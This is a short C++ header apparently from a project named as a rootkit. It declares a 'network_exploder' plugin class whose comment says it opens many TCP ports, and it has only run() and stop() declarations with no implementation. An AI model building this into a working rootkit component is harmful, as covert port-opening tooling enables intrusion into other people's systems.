//
// Created by idan on 12/30/23.
//

#ifndef ROOTKIT_NETWORK_EXPLODER_H
#define ROOTKIT_NETWORK_EXPLODER_H

#include "../../../basic/basic_plugin.h"

// opens many tcp ports
class network_exploder : public basic_plugin {
public:
    void run() override;

    void stop() override;
};


#endif //ROOTKIT_NETWORK_EXPLODER_H
